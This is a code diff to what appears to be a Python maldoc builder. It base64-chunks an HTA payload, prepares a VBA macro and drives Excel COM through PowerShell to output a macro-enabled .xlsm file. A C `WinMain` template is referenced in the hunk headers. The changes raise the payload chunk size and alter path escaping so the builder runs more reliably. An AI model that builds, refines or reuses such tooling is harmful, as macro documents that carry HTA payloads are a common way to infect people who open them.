@@ -3476,9 +3476,9 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
             szs   = f"{sz_kb:.1f} KB" if sz_kb < 1024 else f"{sz_kb/1024:.2f} MB"
             self._xlsx_ln(f"       HTA: {szs}  |  b64: {len(hta_b64)//1024} KB  ✓", "g3")
 
-            # Write b64 chunks to file (1 chunk per line, 900 chars each)
+            # Write b64 chunks to file (1 chunk per line, 8000 chars each — fewer COM calls)
             b64_file = tmp_dir / "data.b64"
-            chunk_size = 900
+            chunk_size = 8000
             chunks = [hta_b64[i:i + chunk_size]
                       for i in range(0, len(hta_b64), chunk_size)]
             b64_file.write_text("\n".join(chunks), encoding="ascii")
@@ -3520,9 +3520,10 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
             self._xlsx_ln(f"\n[2/4]  VBA macro ready  ({len(chunks)} data chunks)  ✓", "cy")
 
             # PowerShell: create .xlsm via Excel COM
-            ps_out = str(out_xlsm).replace("\\", "\\\\")
-            b64_in = str(b64_file).replace("\\", "\\\\")
-            vba_in = str(vba_file).replace("\\", "\\\\")
+            # Use forward slashes — PowerShell & Excel COM both accept them, avoids escape issues
+            ps_out = str(out_xlsm).replace("\\", "/")
+            b64_in = str(b64_file).replace("\\", "/")
+            vba_in = str(vba_file).replace("\\", "/")
 
             ps_script = (
                 '$ErrorActionPreference = "Stop"\n'
